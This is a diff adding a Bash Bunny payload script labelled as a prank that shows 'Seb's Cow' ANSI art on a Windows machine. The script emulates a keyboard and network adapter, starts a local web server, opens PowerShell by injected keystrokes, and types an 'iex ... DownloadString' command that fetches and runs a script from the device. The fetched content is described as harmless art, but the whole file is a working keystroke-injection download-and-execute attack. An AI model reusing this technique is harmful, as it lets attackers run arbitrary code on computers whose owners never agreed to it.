@@ -1,0 +1,38 @@
+#!/bin/bash
+# Title:          ANSI Seb's Cow
+# Description:    Display an ANSI art Seb's Cow
+# Author:         Cribbit
+# Version:        1.0
+# Category:       Pranks
+# Target:         Windows (Powershell 5.1+)
+# Attackmodes:    RNDIS_ETHERNET HID
+# Props:          Hak5's Sebs Cow, Audibleblink (Python Server) and Lee Holmes (compression)
+
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET HID
+
+GET SWITCH_POSITION
+GET HOST_IP
+
+
+cd /root/udisk/payloads/$SWITCH_POSITION/
+
+# starting server
+LED SPECIAL
+
+# disallow outgoing dns requests so server starts immediately
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python -m SimpleHTTPServer 80 &
+
+# wait until port is listening
+while ! nc -z localhost 80; do sleep 0.2; done
+
+# attack commences
+LED ATTACK
+QUACK DELAY 200
+RUN WIN Powershell
+QUACK DELAY 500
+QUACK STRING "iex (New-Object Net.WebClient).DownloadString(\"http://$HOST_IP/moo\")"
+QUACK ENTER
+LED FINISH
+
